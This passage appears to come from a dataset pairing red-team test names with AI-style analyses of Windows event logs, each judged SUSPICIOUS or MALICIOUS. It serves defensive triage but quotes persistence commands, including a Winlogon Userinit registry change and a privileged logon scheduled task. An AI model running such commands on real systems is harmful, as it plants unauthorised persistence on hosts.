  2. **Registry Examination:** Verify the presence and integrity of the DLL `AtomicTest.dll` referenced in the PowerShell command. This DLL should be analyzed for malicious content.
  3. **Forensic Analysis:** Conduct a thorough investigation of the isolated system, focusing on recently modified files, running processes, and network connections.
  4. **Review User Activity:** Investigate the `admin_test` user account for unauthorized access. Consider changing passwords and enforcing strong, multi-factor authentication.
  5. **Log Restoration and Monitoring:** Restore cleared logs if possible for further analysis. Enhance monitoring on similar systems for suspicious PowerShell executions or unauthorized access attempts.
  6. **System Cleanup and Recovery:** Once the threat is fully understood and contained, proceed with system restoration or reinstallation to a known good state."
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"## Analysis of Logs:

### Security Log:
1. **EventID 4624** and **EventID 4672**: Multiple instances of successful logon events and the assignment of special privileges are observed. The logons using `LogonType` 5 indicate logon initiated by a service, which is typical for system processes.
2. **EventID 5379**: Failed credential operation attempts are present on MicrosoftAccount:user, indicated by the `ReturnCode` 3221226021, which signifies the requested operation was unsuccessful. This by itself isn't necessarily malicious but could indicate a service unsuccessfully trying to authenticate.
3. **EventID 4798**: User enumeration activity as indicated by these log events could be a normal behavior depending on the context. But it also could just as easily be used for reconnaissance by an attacker.

### Sysmon Log:
1. **EventID 1** reflecting Process Creation:
   - Execution of `whoami.exe`, `hostname.exe`, and other utilities like `wevtutil.exe`. While these commands may be used legitimately, they can also indicate enumeration activities.
   - Notably, a suspicious PowerShell command executed (`powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\x64\NtQueueApcThreadEx.exe -debug}`), suggesting abnormal code execution potentially tied to malicious behavior or post-exploitation tactics.
   
2. **EventID 5** indicating Process Termination:
   - Indicates normal termination of processes such as `MusNotification.exe` or `compattelrunner.exe`, nothing inherently suspicious about their termination.

### Application Log:
- Includes operational messages from `Software Protection Platform Service`. No evident signs of malicious activity but indicates normal protection checks or events.
  
### Windows PowerShell Log:
- The `NtQueueApcThreadEx.exe -debug` PowerShell script execution stands out as potentially malicious. The script name and location suggest malicious activity, possibly an attempt to run arbitrary or post-exploit commands under a masqueraded execution context using PowerShell.

## Conclusion and Resolution:
- **SUSPICIOUS**: The presence of unusual PowerShell execution and failed credential queries could indicate reconnaissance or potentially malicious setup activities. The activities merit further investigation to confirm if this is part of legitimate administrative tasks or the actions of an intruder. Further response actions should include:
  - Reviewing the timeline and sequence of these events with known user access or operational changes.
  - Investigating the executable `NtQueueApcThreadEx.exe` to verify its origin and legitimacy.
  - Running antivirus/malware detection tools on the host for any known threats.
  - Monitoring for any additional incidents or anomalies following this analysis to investigate further signs of compromise."
Winlogon Userinit Key Persistence - PowerShell,"After a detailed analysis of the provided log entries, here's the assessment:

### Potentially Suspicious Activity:

1. **PowerShell Execution:**
   - The PowerShell logs indicate the execution of a PowerShell command that modifies the ""Userinit"" registry key:  
     ```
     Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force
     ```
   - Modifying the ""Userinit"" registry key to include ""cmd.exe"" is a common technique for persistence used by malware. This alteration can cause the command prompt to execute each time a user logs in, potentially allowing an attacker to automate malicious activities or establish a backdoor.

2. **Sysmon Logs:**
   - The Sysmon logs confirm the execution of ""powershell.exe"" as depicted in the PowerShell logs. The command executed is identical to the suspicious registry modification detected earlier.
   - Multiple instances of ""wevtutil.exe"" and ""conhost.exe"" appear in rapid succession. While not inherently malicious, such activity could be indicative of log tampering or attempts to cover tracks, especially when coupled with suspicious PowerShell activity.

3. **Edge Update Executions:**
   - Several instances of Microsoft Edge Update executables are running. While these could be legitimate update processes, it's unusual to have a high frequency of update checks within a short timeframe, especially if they aren't scheduled or typical for the system's standard operation.

### Assessment:

Based on the analysis, the activity logs show signs that could indicate malicious behavior, primarily due to the modification of the ""Userinit"" registry key by a PowerShell script. This action is a known technique for persistence that attackers use to maintain access to a compromised system. Additionally, the sequence of Edge updates and frequent executions suggests an anomaly that must be further evaluated to rule out false positives or incomplete legitimate updates.

### Resolution: **SUSPICIOUS**

**Recommendation:**
- Immediately investigate the changes to the ""Userinit"" registry key and ensure it is set back to its default configuration if necessary.
- Conduct a thorough forensic analysis of the affected machine to confirm any unauthorized access and determine the scope of potential compromise.
- Review system policies and restrict PowerShell usage to prevent unauthorized execution of scripts.
- Evaluate the logs for the surrounding time period to identify any patterns or potential indicators of further compromise, especially in the context of the ""EdgeUpdate"" process.
- Monitor for any unusual network activity that may suggest exfiltration or command and control traffic.

The activity requires further validation through forensic analysis to determine its true intent and any additional impact on the host and network."
Service Installation PowerShell,"Upon analyzing the provided Windows event logs, several observations can be made regarding potentially suspicious activity:

1. **PowerShell Activity**: The logs show a PowerShell command that was executed to create a new service (`fileTestService_PowerShell`) using the New-Service cmdlet with the binary path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`. The use of PowerShell to create services, especially from a temporary directory, is a common technique used by malicious actors to establish persistence on a system, as it allows for the execution of arbitrary binaries under the guise of a service.

2. **Service Created**: The System log corroborates this by showing an event (Event ID 7045) from the Service Control Manager indicating that the `fileTestService_PowerShell` was created with an auto start explicitly as a user mode service and running under the `LocalSystem` account. This is a potential privilege escalation, as it allows the service to run with high privileges.

3. **Unusual Directory**: The image path for the service is located in a user's temporary directory, which is unusual for legitimate system services that are typically located in standard directories such as `C:\Program Files` or `C:\Windows\System32`.

4. **Sysmon Events**: There are multiple Sysmon events that highlight the execution of `powershell.exe` with elevated privileges, followed by the execution of the aforementioned `fileService.exe`, indicating that the binary was indeed executed. The lack of a file description, version, and company in the service binary metadata is another red flag, as legitimate software typically includes this information.

5. **Application Log**: The logs show that the `fileService` started successfully, but there's minimal context provided about its purpose or execution details, raising suspicion about what actions it performed during its runtime.

6. **Edge Update**: There are entries related to Microsoft Edge updates (e.g., `MicrosoftEdgeUpdate.exe` and its related executables). These seem legitimate due to valid file versions, proper file descriptions, and standard installation paths. Such events are common for systems that auto-update software like Microsoft Edge.

Given the context and the points outlined, it is prudent to classify the findings as:

- **SUSPICIOUS** - While the PowerShell activity and creation of a service in a temporary directory are commonly associated with malicious behavior, further investigation is necessary to determine if `fileService.exe` contains malicious code or if it was intended by system administrators for legitimate purposes. Furthermore, analyzing other logs such as network or antivirus logs, and checking the hash of `fileService.exe` against known threat databases, can provide additional context.

### Guidance on How to Proceed:
1. **Immediate Containment**: Temporarily disable the `fileTestService_PowerShell` service to prevent potential malicious activity while further investigation is ongoing.

2. **File Analysis**: Retrieve `fileService.exe` from the specified path and conduct a thorough analysis, including hash checking, static/dynamic analysis, and scanning with an updated antivirus or security tool.

3. **Audit Permissions and Accounts**: Check for unauthorized changes to system configurations and ensure that user accounts, especially the account initiating the service, have not been compromised. Audit any commands or processes initiated under suspicious accounts.

4. **Monitor Network Traffic**: Use network monitoring tools to detect any unusual outbound connections from the host that could indicate data exfiltration or communication with a command and control server.

5. **Communication and Documentation**: Document the findings and associated actions while maintaining clear communication with relevant teams to mitigate potential impacts effectively.

By taking these steps, the organization can ascertain whether the activity is genuinely malicious or part of an unexplained but benign administrative operation, providing clarity for an informed resolution of the issue."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"Upon reviewing the provided Windows event logs, several elements stand out that merit further examination. Here's a detailed analysis of each log category, as well as a final assessment:

### Application Log Analysis
- **SecurityCenter EventID 15**: This states that Windows Defender is on. This is standard and non-suspicious.
- **Microsoft-Windows-Security-SPP EventID 16384**: Indicates normal operations related to software protection, typical for Windows systems.

### System Log Analysis
- **Windows Update Client EventID 19**: This shows a successful update for Microsoft Defender Antivirus, which is standard behavior.
- **Kernel-General EventID 24 and EventID 1**: These events show time changes, which can be normal if due to Daylight Saving Time adjustments or network-based time corrections. However, multiple consecutive time adjustments could indicate tampering.

### Windows PowerShell Log Analysis
- **PowerShell EventID 600**: The command line execution involves a process creation with `CreateRemoteThread.exe`, typically a red flag. This behavior can be used for process injection, commonly seen in malicious activities.

### Security Log Analysis
- **Security-Auditing EventID 4616 and others**: Shows time adjustment and user privilege allocation, normal under many circumstances but potentially suspicious when frequent or unexplained.
- **Security-Auditing EventID 4672**: The presence of high privileges (`SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`, etc.) being used might indicate high-level operations that are unusual outside administration tasks.

### Sysmon Log Analysis
- **Process Creation and CmdLine (Wevtutil.exe, etc.)**: Regular tools and utilities are being executed. However, their usage should be scrutinized if not expected in normal operations.
- **Process Creation (Powershell with CreateRemoteThread)**: This is particularly concerning as it indicates the potential for code injection into other processes.
- **EventID 1 for common utilities**: Normal in most cases, but given suspicious PowerShell activity, it's suspect if aligning with unexpected network or administrative activities.

### Final Assessment
- The execution of `CreateRemoteThread.exe` in conjunction with PowerShell is highly suspect and aligns with typical malicious activity, such as injecting payloads into legitimate processes.
- Time anomalies in the logs could be benign but warrant correlation with user activity logs and any network activity around the same timestamps.

### Resolution
The analysis suggests that some activities present in the logs are indicative of malicious intent:

- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed
1. **Isolate**: Immediately isolate the affected system from the network to prevent any potential spread of malicious activity.
2. **Contain and Analyze**: Conduct deeper forensic analysis on the affected host. Inspect the instances of `CreateRemoteThread.exe` and correlate them with user actions and network logs.
3. **Mitigation Steps**: Review privileges granted to users, especially `admin_test`. Validate necessary permissions and remove any superfluous access.
4. **Incident Response**: Follow through with your Incident Response plan to address this potential compromise, including notifying relevant teams, stakeholders, and legal (if personal data interfaced).
5. **Further Monitoring**: Deploy enhanced logging and continuous monitoring for similar PowerShell and time-altering activities across other assets in the network.

Identifying and responding to this malicious activity is essential to secure the environment and prevent further compromise."
Parent PID Spoofing - Spawn from svchost.exe,"After analyzing the provided Windows event logs across various logs (Windows PowerShell, System, Security, Sysmon), here are my findings:

### Summary Analysis

1. **PowerShell Activity:**
   - There is a repeated execution of a PowerShell script that uses `Get-CimInstance` to query processes named 'svchost.exe' and starts another PowerShell process sleeping for 10 seconds. The use of command-line arguments and PowerShell indicates potential probing or setup activities, which could be normal automation or something more malicious.
   - The subsequent PowerShell script also checks `.inf` files to see if they match certain installation criteria. Such activity might be part of an automated audit or systems monitoring task.

2. **System Updates:**
   - A series of Microsoft updates are observed in the System event logs. This includes updates for various Microsoft components, which appears routine and does not indicate any signs of malicious activity.

3. **Security Logs:**
   - The security logs primarily show failed credentials accesses (event ID 5379) and successful system logons (event ID 4624). There was also a logon event with high privileges (event ID 4672), denoting standard high privileges allocations for `SYSTEM` account-related operations.

4. **Sysmon Logs:**
   - There are numerous process creation events logged. Some observations include:
     - PowerShell execution by a user named `admin_test`.
     - Utilities like `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe` being triggered, which could relate to normal administrative actions or scripted tasks.
     - Repeated execution of `CompatTelRunner.exe`, indicating telemetry-related activities.
     - Notably, there was a `powershell.exe` execution with a command line referencing `Start-ATHProcessUnderSpecificParent`, which could be benign, but since it employs techniques for running PowerShell under a specific process, it warrants further investigation.

### Assessment

- **Benign Activities:**
  - The system updates and standard telemetry operations appear to be benign, aligning with routine operations on the system.

- **Suspicious Activities:**
  - The PowerShell command involving `Start-ATHProcessUnderSpecificParent` coupled with querying processes and operating in an admin context is suspicious. This could indicate attempts to evade detection (running under specific processes) or script-based activity often associated with initial compromise efforts or scripted administration that might not adhere to best practices.

### Final Resolution

**SUSPICIOUS** 

### Guidance on How to Proceed

1. **Immediate Investigation:**
   - Investigate the purpose of the PowerShell scripts observed in logs, especially the command: `Start-ATHProcessUnderSpecificParent`. Confirm whether this activity is part of an official administrative or scheduled task.
   - Review user activities and permissions for `admin_test` to determine if these actions align with expected behaviors.

2. **Host Auditing:**
   - Conduct a full security audit on the host machine, Server002, to check for unusual scripts or scheduled tasks that might explain the observed PowerShell activity.
   - Collect additional logs or enable more verbose logging for PowerShell activities to capture script block logging which can provide more insights.

3. **Contact IT or Security Team:**
   - If no administrative schedule or task justifies these scripts and context, involve the IT or security team to further investigate potential unauthorized access or script execution.

Taking these steps will help ensure that if the suspicious activity is benign, it is documented, and if it is malicious, it can be addressed promptly."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"Upon examining the provided Windows event logs, several suspicious and potentially malicious activities were found. Here’s a detailed breakdown:

### Suspicious and Anomalous Behavior

1. **Time Manipulation Event:**
   - Security logs `EventID 4616` indicate that the system time was altered (repeated twice within milliseconds). This is often concerning as attackers may change system time to hide tracks or match timelines.

2. **High Privilege Logons:**
   - Security logs with `EventID 4672` indicate that the user `admin_test` obtained special privileges that include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. This is a red flag, as such privileges are usually needed for system-level operations and could be exploited if compromised.

3. **Remote Logon via NTLM:**
   - Security logs `EventID 4624` indicate several logons from a remote system (`DESKTOP-3HL5B2P`) using NTLM authentication which isn't recommended for secure environments. The `admin_test` account is repeatedly involved, raising suspicion regarding unauthorized access.

### Potentially Malicious Activity

1. **PowerShell Execution with Suspicious Script:**
   - Sysmon logs `EventID 1` and Windows PowerShell logs show evidence that a PowerShell script was executed (`Get-WinlogonTokenSystem.ps1`) from a remote source intended for token manipulation. This is typically associated with attempts to escalate privileges or lateral movement.

2. **Repeated Use of `wevtutil.exe` and Conhost.exe:**
   - Sysmon logs indicate repeated execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate utility used for managing event logs but can also be used maliciously for clearing event logs.

3. **Token Manipulation:**
   - PowerShell logs confirm the use of a known public script for token manipulation, which is a common tactic to gain SYSTEM privileges.

4. **Use of `whoami.exe`:**
   - The execution of `whoami.exe` is a standard command-line utility to display current user information. However, its occurrence after execution of suspicious scripts suggests possible reconnaissance or privilege confirmation by an unauthorized actor.

### Assessment of the Situation

- The consistent pattern of elevated privilege acquisition, execution of suspicious scripts, and potential time manipulation suggests a compromise involving the `admin_test` account on `Server002`.
- There is a clear attempt to download and execute potentially harmful scripts that manipulate system tokens, indicative of an attack seeking privilege escalation or persistence mechanisms.

### Threats, Risks, and Recommendations

- **Risks:**
  - The main risk involves the use of high privileges and potential compromise leading to lateral movement within the network.
  - NTLM authentication from external sources needs further scrutiny.

- **Recommendations:**
  - Immediate containment of the `admin_test` account.
  - Conduct a full forensic analysis to trace the source and extent of the compromise.
  - Enhance monitoring to detect anomalous behaviors, especially around privileged accounts.
  - Consider revising authentication mechanisms, like moving from NTLM to more secure protocols.

### Conclusion: Resolution

Based on my analysis, these logs display evidence of **MALICIOUS** activity due to the unauthorized privilege escalation attempts, suspicious script execution, and potential time manipulation indicating a significant compromise of `Server002`. Thorough investigation and containment actions are advised promptly."
Domain Password Policy Check: Common Password Use,"In reviewing the provided logs, I identified several activities and patterns. Below is the analysis with findings that may help assess the potential security implications:

### Analysis of Logs:

1. **Repeated Process Execution**:
   - Multiple executions of `conhost.exe` and `wevtutil.exe` were observed. These processes are standard Windows executables, with `wevtutil.exe` typically used to manage event logs. Frequent calls in short succession can be normal but warrant checking depending on context.
   - These commands are executed by the user ""SERVER002\admin_test"", indicating a user account possibly conducting operations on event logs, which could be routine if carried out by a system administrator.

2. **PowerShell Activity**:
   - A significant PowerShell command was executed, which involves reading a credential file and attempting to set a password. The script appears to automate the process of handling password changes for the current user. It checks the current password and attempts to set a new one based on a predefined pattern (`Spring$((Get-Date).Year)!`).
   - This activity can be legitimate, part of an automated system maintenance or password policy script. However, sensitive data handling may be exposed—such as credentials—implying potential risks if handled insecurely or run by malicious entities.

3. **Process and Command Line Details**:
   - Processes like `whoami.exe` and `hostname.exe` executed, which are basic tools to gather system information and generally benign unless there’s abnormal behavior following these.
   - The Edge browser update-related activities are apparent, which include installations and setups executed by `setup.exe`. These are common under system-level operations managed by NT AUTHORITY\SYSTEM during updates or installations, a typical system behavior unless linked with suspicious downloads or external sources.

4. **Account Privilege Operations**:
   - A `Security` log entry indicates a user group enumeration operation (`EventID 4799`) triggered by an Edge update-related setup process. This action is not inherently malicious but should be monitored for consistency with ordinary system behavior or unusual privilege escalation.

### Assessment and Recommendation:

**Resolution**: **SUSPICIOUS**

- **Rationale**: The PowerShell script handles sensitive operations (like credential management), which, although they can be justified as part of IT administration, should be further verified regarding who executed it, under what context (timing, unusual access patterns), and most importantly, whether the commands are expected or sanctioned by IT/security policies. Handling credentials within scripts poses potential risks if any breach or compromise scenario exists.
- **Next Steps**:
  - **User Validation**: Check the legitimacy and the context under which ""admin_test"" and related accounts are executing these commands. Ensure these actions are approved and expected from this user.
  - **Review Scripts**: Review the PowerShell scripts for security best practices, ensuring sensitive data is handled with appropriate safeguards.
  - **Monitor Abnormal Usage**: Continue monitoring these patterns for any deviations or repeated unexpected activities to capture any signs of potential malicious act.
  - **Possible Policy Review**: Verify if password policies or related automation scripts run as expected and if are securely implemented.

While the logs primarily suggest benign or legitimate activities, aspects of the PowerShell script handling sensitive password operations need further scrutiny to affirm they align with organizational security policies, warranting the classification of the activity as ""suspicious."""
WMI Invoke-CimMethod Scheduled Task,"**Analysis of the Log Entries**

1. **Time Changes in System Logs:**
   - The events in the system log indicate multiple abrupt changes in system time (`EventID: 1`), which are executed by `svchost.exe`. Typically, time adjustments are part of normal operations when syncing with a time server, but frequent arbitrary changes could be related to malicious activities designed to hide traces by manipulating timestamps.
   - `EventID: 24` logs in the system appear once before the time change and once after, showing minute adjustments. This might not be significant on its own, but in conjunction with other suspicious activities, it may warrant further examination.

2. **Commands Executed via PowerShell:**
   - The `Sysmon` logs show executions of `powershell.exe` with specific command-line arguments indicating a sophisticated script being run. This script loads and executes a configuration (`data_005_WMI.xml`) for scheduling tasks using the `Invoke-CimMethod` cmdlet. This method is often used by malicious actors to establish persistence mechanisms through scheduled tasks.
   - The context of spawning `powershell.exe` without visible administrator approval, potentially running scripts, suggests nefarious usage. The high integrity level associated with these actions further points to elevated privilege execution.

3. **Security Log Indicators:**
   - `EventID 4672` in the Security log indicates that user `admin_test` was granted special privileges, including potentially dangerous privileges such as `SeDebugPrivilege` or `SeTakeOwnershipPrivilege`. This indicates a high level of access which could be misused by an attacker or rogue administrator.
   - The logon events for `admin_test` over `NTLM` (`EventID: 4624`) could imply remote access or usage of credentials outside of normal domain authentication pathways, potentially signaling a compromised account.

4. **Operational Behavior and Consistency:**
   - Frequent usage of tools like `whoami.exe` and `hostname.exe` (`Sysmon EventID: 1`) appear benign on their own, as these are used for determining the current user and host context, but in combination with the other behaviors, they could suggest reconnaissance activity as part of malicious operations.

**Assessment of the Situation**

- The logs show a combination of indicators that suggest suspicious activity:
  - **PowerShell Execution:**
    Suspicious scripts executed via PowerShell involving scheduled task registration.
  - **Time Manipulation:**
    Frequent time changes potentially as an attempt to cover tracks.
  - **High Privilege Usage:**
    Potential misuse of user privileges and unexpected remote logons.
  
- Given the elevated privileges and system interactions noted, these behaviors could lead to significant security concerns such as unauthorized access, data exfiltration, or the establishment of persistent access by an attacker.

**Resolution: SUSPICIOUS**

This assessment suggests that the observed activities are suspicious and warrant further detailed investigation to confirm if malicious activities are occurring. 

**Guidance on How to Proceed**

1. **Conduct a Forensic Analysis:**
   - Perform a deeper forensic analysis of the affected system, focusing on filesystem and memory analysis to spot any signs of further compromise or persistent threats.
   
2. **User Account Auditing:**
   - Conduct a thorough review of the `admin_test` account, logon patterns, and associated systems or credentials. Consider resetting credentials as a precaution.

3. **PowerShell Script Review:**
   - Investigate the source and content of the PowerShell script (`data_005_WMI.xml`) to understand its purpose and origin. Ensure that these scripts align with expected and approved operations.

4. **Network and Firewall Logs:**
   - Examine network traffic and firewall logs during the time period for any abnormal outbound/inbound connections associated with the host `Server002`.

5. **Monitoring and Alerting:**
   - Enhance monitoring and alerting around changes in system time, privilege assignments, and PowerShell execution going forward.

6. **Contact the Affected User:**
   - Communicate with the user of `admin_test` to verify recent activities and determine if any reported behavior can be explained or if their account may have been compromised.

Final recommendation is to closely monitor the system and take preventative actions to further protect the network from potential compromise."
Azure AD - adding user to Azure AD role,"Based on the logs provided, the following analysis has been conducted:

### Observations:

1. **PowerShell Logs:**
   - The PowerShell logs indicate that a script was executed to interact with Azure Active Directory (AzureAD). This script imports the AzureAD module, converts a password to a secure string, and uses specified credentials to connect to AzureAD.
   - The script then attempts to find a user named ""SuperUser"" and a role titled ""Global Reader"". If found, it adds the user to the specified directory role.
   - This operation involves the use of PowerShell scripts to modify user roles within AzureAD, which could be a legitimate administrative action. However, the exposure of passwords in scripts, even as secure strings, could be an indicator of poor security practices.

2. **Sysmon Logs:**
   - Numerous processes associated with `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe` are being executed by the user `SERVER002\admin_test`.
   - Of particular note is the usage of `whoami.exe` and `hostname.exe`, which may suggest that someone is verifying user credentials and system information. This is often a precursor to more nefarious actions if used without context.
   - The presence of `svchost.exe` entries indicates normal background service operations, although their frequent logging in quick succession might require additional context.

3. **Command Line Usage:**
   - The command line from the Sysmon logs shows the PowerShell script being executed directly, which is consistent with administrative tasks meant to automate user role assignments.

### Conclusion:

- The activity shown, while potentially legitimate, presents some concerning signs that deserve further scrutiny:
  - The exposed password, albeit transformed into a secure string, indicates potential security oversight, as best practices dictate never hardcoding credentials within scripts.
  - The use of PowerShell for AzureAD role assignment should be verified against known processes. If this was not part of scheduled administrative tasks, it could be indicative of unauthorized access attempts or policy violations.
  - Frequent checking of user and machine identity through `whoami.exe` and `hostname.exe` may imply reconnaissance activity.

### Resolution:
- **SUSPICIOUS:** The logs include activities that warrant further investigation. Specifically, confirm if the PowerShell usage is consistent with regular administrative operations, validate the necessity of user and system identity verifications, and ensure credential management aligns with security protocols.

### Guidance on Next Steps:
1. Verify with the administration team whether the execution of the PowerShell script was authorized and aligns with typical administrative tasks.
2. Examine past logging activities to establish if the use of `whoami.exe` and `hostname.exe` is a common practice for the user `SERVER002\admin_test`.
3. Conduct a review of credential handling practices, ensuring no login details are stored or transmitted insecurely.
4. Consider deploying additional monitoring or alerts for atypical PowerShell activities or credential management violations.

This additional investigation will help definitively categorize the activities as benign, suspicious, or malicious, thereby enhancing organizational security posturing."
SystemBC Malware-as-a-Service Registry,"### Detailed Analysis of Windows Event Logs

#### Security Log Analysis
- **Event ID 4616 (""System time was changed""):** These events indicate that system time changes occurred. The changes were minimal and seemed legitimate as they were performed by the `LOCAL SERVICE` account, typically used by Windows services. The processes involved were `svchost.exe`, a standard system process often running various services.
  
#### Application Log Analysis
- **EdgeUpdate Service Stopping:** Messages indicate the `edgeupdate` service was stopped. While stopping services can be normal, it is important to verify if these stops correlate logically with expected system or administrative activity.

#### System Log Analysis
- **Kernel-General and Time-Service Events:** These events confirm time synchronization activities. The interactions between the Kernel-General and Time-Service align with regular time adjustment processes, interacting with `time.windows.com` for time synchronization, which is standard behavior.

#### Windows PowerShell Log Analysis
- **PowerShell Activity (Event ID 600):** The PowerShell logs reveal the use of a hidden PowerShell script to set registry properties. The command modifies the Windows registry's `Run` key to execute a PowerShell script in a hidden window with ExecutionPolicy Bypass. This behavior is highly suspicious because it attempts to run scripts automatically with no user visibility and reduced security checks, which can be indicative of an attempt to maintain persistence on the system or execute unauthorized scripts.

#### Sysmon Log Analysis
- **Multiple Entries with Administrative Activity:** The logs recorded numerous events involving system utilities such as `wevtutil.exe` and `conhost.exe` run by the user `SERVER002\admin_test`. While these could indicate legitimate administrative tasks, their frequency within a short time frame might need further scrutiny.
- **HOSTNAME.EXE and WHOAMI.EXE Executed:** The execution of basic system command line utilities such as `hostname` and `whoami` could be normal; however, they might also be part of reconnaissance activities if combined with other suspicious activities.
- **EdgeUpdate.exe Execution:** Multiple entries indicate `MicrosoftEdgeUpdate.exe` processes. While not inherently malicious, the volume and patterns need to be cross-checked against update schedules to ensure they align with expected Microsoft Edge updates.

### Assessment and Conclusion
1. **Suspicious Activities Identified:** 
   - PowerShell script with `ExecutionPolicy Bypass` modifying the registry's Run key could suggest potential compromise or persistence mechanisms in place.
   - Frequent use of system utilities by `SERVER002\admin_test` alongside PowerShell activities should be reviewed in more detail for context.

2. **Recommended Actions:**
   - Investigate the origin and purpose of the PowerShell script modifying registry settings.
   - Review other logs or system configurations for changes initiated around similar times to identify possible anomalies.
   - Conduct a scan for known indicators of compromise on the host.
   - Ensure that all relevant systems have security patches and updates applied to mitigate potential exploit vectors.

### Final Resolution: **SUSPICIOUS**
The logs show suspicious activity that warrants a more in-depth investigation to confirm whether it represents a potential security threat or benign administrative actions. Further analysis, including behavior correlation with user activities, system updates, and alerting on abnormal patterns, is advisable."
Powershell Cmdlet Scheduled Task,"Based on the provided logs, let's break down the analysis to identify any suspicious or anomalous activities.

### Analysis

#### Windows PowerShell Log

Several log entries indicate the execution of PowerShell scripts with the following characteristics:

1. **Scheduled Task Creation:**
   - The logs include a PowerShell command that creates a new scheduled task to execute `calc.exe`. The task is set to trigger at logon and runs with the highest privilege level (`BUILTIN\Administrators`).
   - Command: 
     ```
     $Action = New-ScheduledTaskAction -Execute ""calc.exe""
     $Trigger = New-ScheduledTaskTrigger -AtLogon
     $User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
     $Set = New-ScheduledTaskSettingsSet
     $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
     Register-ScheduledTask fileTask -InputObject $object
     ```
   - This activity is highly suspicious due to the use of PowerShell to execute a GUI application like `calc.exe` in a scheduled task with elevated privileges, which could be a test for executing arbitrary commands or malware.

#### Sysmon Log

The Sysmon logs show typical Windows operations such as executions of common system tools like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. However, no overtly malicious behaviors are evident directly from these logs alone. The Sysmon log appears to be largely benign, showing typical administrative or system activities.

### Assessment

- **Suspicious Activity:**
  - The PowerShell script that registers a scheduled task to execute `calc.exe` at logon with elevated privileges is anomalous and requires further investigation. Although running `calc.exe` isn't inherently malicious, the method of execution (via scheduled task and privilege escalation) coupled with lack of context makes it suspicious.

- **Benign Activity:**
  - Frequent execution of standard Windows utilities as shown in the Sysmon logs (like `hostname.exe` and `whoami.exe`) appears regular for administrative tasks.

### Risk and Threat Evaluation

- **Risk:** The main risk identified is the potential misuse of PowerShell scripts to maintain persistent administrative access using scheduled tasks with high privileges.
- **Threat:** An attacker could replace benign-looking payloads such as `calc.exe` with malicious ones after verifying script or scheduling access.

### Resolution

**Resolution: SUSPICIOUS** 

The activity in the logs indicates that further investigation is necessary to determine the intent and context of the PowerShell script execution. It includes a benign-looking application (`calc.exe`), but the scheduling and privilege level suggest potential misuse or test runs for malicious intentions.

### Recommendations

1. **Detailed Audit:** Review the creation and modification history of scheduled tasks on `Server002` to check for unapproved changes.
2. **Perform a User Audit:** Investigate the activities of `SERVER002\admin_test` around the timestamp of the suspicious logs to understand the broader context.
3. **Validate PowerShell Usage:** Inspect recent PowerShell scripts executed on this system and, if necessary, restrict unauthorized script executions.
4. **Network Analysis:** Conduct analysis to ascertain if there is any known pattern or communication anomaly associated with this server around similar timestamps.
5. **Endpoint Protection:** Ensure advanced endpoint protection is installed to detect and thwart any potential execution of unauthorized tasks or scripts in the future."
Suspicious bat file run from startup Folder,"Based on the analysis of the provided logs, several points of interest and potential concerns regarding suspicious activity have been identified:

1. **Frequent Execution of Core Windows Binaries**: 
   - The logs show multiple executions of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`. While these are legitimate Windows binaries, frequent and rapid execution could be indicative of automated scripts or a process running reconnaissance commands.

2. **PowerShell Activity**:
   - There is a PowerShell command logged with operations copying a `.bat` file to the startup directories, which can be a technique to establish persistence. It is an unusual command because it could mean a script is being set up to run on startup, which could be benign or malicious depending on the context.

3. **Commands Executed from System32 and Startup Folders**:
   - The specific PowerShell command that involves copying `batstartup.bat` to startup locations (`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\` and `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`) is suspicious. This technique is often used by malware to maintain persistence on a system.

4. **Integrity Level and High Privilege**:
   - Events show processes running with high integrity level under the user `SERVER002\admin_test`, indicating that these operations were performed with elevated privileges which can magnify the impact if they were malicious activities.

5. **Unusual Use of `wsmprovhost.exe`**:
   - This application is seen as a parent process for certain actions. While legitimate in remote management contexts, its use along with the PowerShell action merits further investigation, as it may be used for executing scripts remotely.

6. **Time Change Event Logs**:
   - There are several security events indicating a change in the system time. Although they are not inherently suspicious, time changes can be used to manipulate event logs.

**Assessment and Recommendation**:

- **Resolution: SUSPICIOUS**
  - The logs indicate suspicious activity, particularly concerning the PowerShell command that sets files to run on startup and the repeated execution of reconnaissance type commands (whoami, hostname) with high privileges. This activity warrants further investigation.
  
**Next Steps**:

1. **Validate Changes**: Confirm whether the PowerShell commands and setup were authorized changes by system administrators.
   
2. **Examine Startup Directories**: Check the contents of the startup directories for unauthorized files and understand why `batstartup.bat` was used if it exists.

3. **User Activity Review**: Review activities performed by the user `admin_test` to see if they match typical usage patterns or correlate with any administrative task schedule.

4. **Retrospective Analysis**: Analyze logs for earlier instances or correlations with external IP addresses, unusual times of activity, or patterns that may suggest further reconnaissance or lateral movement efforts.

5. **Perform Endpoint Security Checks**: Scan the system for malware and ensure antivirus definitions are up-to-date and running a full scan on the system.

6. **Contact Relevant Personnel**: Engage with system administrators and the user associated with `admin_test` to verify the legitimacy of actions."
Add persistance via Recycle bin,"Upon analyzing the provided event logs, a detailed examination is provided below:

### Analysis:

1. **Sysmon Logs:**
   - The Sysmon logs detail several process creations and terminations primarily involving Microsoft Edge Update processes. These processes indicate routine Microsoft Edge update activities, which generally involve installing updates, registering services, and managing update components.
